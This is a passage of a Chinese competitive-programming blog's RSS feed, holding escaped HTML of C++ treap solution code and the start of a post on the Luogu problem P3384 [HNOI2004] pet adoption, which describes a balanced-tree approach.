class=&#34;keyword&#34;&gt;return&lt;/span&gt; r;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;find&lt;/span&gt;(r-&amp;gt;ch[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;],x-&lt;span class=&#34;built_in&#34;&gt;size&lt;/span&gt;(r-&amp;gt;ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;])&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;del&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(Node *p)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!p-&amp;gt;ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] &amp;amp;&amp;amp; !p-&amp;gt;ch[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(p==root)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                root=&lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            Node *pa=p-&amp;gt;pa;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(pa)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                pa-&amp;gt;ch[p==pa-&amp;gt;ch[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]]=&lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(p!=root)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;built_in&#34;&gt;update&lt;/span&gt;(p=p-&amp;gt;pa);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(p-&amp;gt;ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] &amp;amp;&amp;amp; p-&amp;gt;ch[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; f=(p-&amp;gt;ch[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]-&amp;gt;rnd &amp;lt; p-&amp;gt;ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]-&amp;gt;rnd);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;rotate&lt;/span&gt;(p-&amp;gt;ch[f],f);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; f=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(p-&amp;gt;ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;])f=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;rotate&lt;/span&gt;(p-&amp;gt;ch[f],f);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;del&lt;/span&gt;(p);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;kth&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(Node *r,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(x&amp;lt;=&lt;span class=&#34;built_in&#34;&gt;size&lt;/span&gt;(r-&amp;gt;ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]))&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;kth&lt;/span&gt;(r-&amp;gt;ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;],x);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(x==&lt;span class=&#34;built_in&#34;&gt;size&lt;/span&gt;(r-&amp;gt;ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;])+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; r-&amp;gt;d;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;kth&lt;/span&gt;(r-&amp;gt;ch[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;],x-&lt;span class=&#34;built_in&#34;&gt;size&lt;/span&gt;(r-&amp;gt;ch[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;])&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;getUpper&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; c;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(c=&lt;span class=&#34;built_in&#34;&gt;getchar&lt;/span&gt;())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;isupper&lt;/span&gt;(c))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; c;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;srand&lt;/span&gt;((&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)&lt;span class=&#34;built_in&#34;&gt;time&lt;/span&gt;(&lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; Q,Min,x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; op;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d%d&amp;quot;&lt;/span&gt;,&amp;amp;Q,&amp;amp;Min);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; ans=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,delta=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(Q--)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            op=&lt;span class=&#34;built_in&#34;&gt;getUpper&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;,&amp;amp;x);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;switch&lt;/span&gt;(op)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;I&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(x&amp;lt;Min)&lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    Node *p=&lt;span class=&#34;built_in&#34;&gt;newnode&lt;/span&gt;(x-delta);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;built_in&#34;&gt;insert&lt;/span&gt;(root,p);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;built_in&#34;&gt;treap&lt;/span&gt;(p);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;A&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    delta+=x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;S&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    delta-=x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; xtq=&lt;span class=&#34;built_in&#34;&gt;size&lt;/span&gt;(root);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i&amp;lt;=xtq;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;kth&lt;/span&gt;(root,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)+delta&amp;lt;Min)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            &lt;span class=&#34;built_in&#34;&gt;del&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;find&lt;/span&gt;(root,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                            ans++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;F&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(x&amp;gt;&lt;span class=&#34;built_in&#34;&gt;size&lt;/span&gt;(root))&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;-1\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d\n&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;kth&lt;/span&gt;(root,&lt;span class=&#34;built_in&#34;&gt;size&lt;/span&gt;(root)-x+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)+delta);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d\n&amp;quot;&lt;/span&gt;,ans);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://cubicy.icu/2018/04/09/%E6%B4%9B%E8%B0%B7P3384%20[HNOI2004]%E5%AE%A0%E7%89%A9%E6%94%B6%E5%85%BB%E5%9C%BA/</guid>
            <title>洛谷:P3384 [HNOI2004]宠物收养场</title>
            <link>http://cubicy.icu/2018/04/09/%E6%B4%9B%E8%B0%B7P3384%20[HNOI2004]%E5%AE%A0%E7%89%A9%E6%94%B6%E5%85%BB%E5%9C%BA/</link>
            <category>Treap</category>
            <category>Splay</category>
            <pubDate>Mon, 09 Apr 2018 22:05:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;原题地址:&lt;a href&gt;https://www.luogu.org/problemnew/show/P3384&lt;/a&gt;  &lt;/p&gt;
&lt;h3 id=&#34;题目简述&#34;&gt;&lt;a href=&#34;#题目简述&#34; class=&#34;headerlink&#34; title=&#34;题目简述&#34;&gt;&lt;/a&gt;题目简述&lt;/h3&gt;&lt;p&gt;给定一些序列&lt;strong&gt;（没有重复数字）&lt;/strong&gt;，每个序列支持：&lt;br&gt;给定一些数k&lt;strong&gt;（对于每个序列不重复）&lt;/strong&gt;，每次在序列里找到最接近k的数删除（如果有2个数字与k差一样，即分别是k-b和k+b，则选择较小的k-b），累加与k的差，输出。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;思路&#34;&gt;&lt;a href=&#34;#思路&#34; class=&#34;headerlink&#34; title=&#34;思路&#34;&gt;&lt;/a&gt;思路&lt;/h3&gt;&lt;p&gt;其实关键就是维护一个有序序列，支持插入，查询前继后继，删除指定数字。&lt;br&gt;自然我们会想到手打平衡树，Treap&amp;#x2F;Splay皆可。（这里只有旋转实现的Treap，非旋Treap（Split+Merge）和Splay日后加上）&lt;br&gt;Tips:为了防止越界等问题以及方便提取区间（尤其是Splay），序列前后一般塞上一个-INF和INF&lt;br&gt;然而作为C++选手，我们应该妙用STL。set可以实现这样的功能，内部是红黑树实现的也很快。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;代码&#34;&gt;&lt;a href=&#34;#代码&#34; class=&#34;headerlink&#34; title=&#34;代码&#34;&gt;&lt;/a&gt;代码&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;旋转实现的Treap(160ms,3.03MB)&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span 